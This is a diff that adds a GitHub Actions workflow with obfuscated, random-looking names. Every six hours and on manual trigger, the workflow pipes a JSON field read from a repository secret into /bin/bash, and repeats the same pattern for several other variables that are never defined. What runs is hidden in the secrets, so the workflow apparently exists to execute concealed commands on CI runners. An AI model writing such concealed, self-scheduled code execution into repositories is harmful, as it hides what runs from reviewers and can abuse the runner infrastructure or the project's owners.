@@ -1,0 +1,27 @@
+name: zhipingguoioss
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: zhipingguoioss
+        env:
+          wlg947: ${{ secrets.wlg947 }}
+        run: |
+          echo $wlg947 | jq -r .r19106 | /bin/bash
+          echo $ebta6 | jq -r .frhxq714 | /bin/bash
+          echo $sw5575 | jq -r .njrd7430 | /bin/bash
+          echo $gs13224 | jq -r .h5 | /bin/bash
+          echo $pqmaf401 | jq -r .pgyru706 | /bin/bash
+          echo $lrhv3994 | jq -r .i5 | /bin/bash
+          echo $bx8 | jq -r .wfnlt7 | /bin/bash
+          echo $pu345 | jq -r .zura8 | /bin/bash
+          echo $khk08740 | jq -r .ud8982 | /bin/bash
+
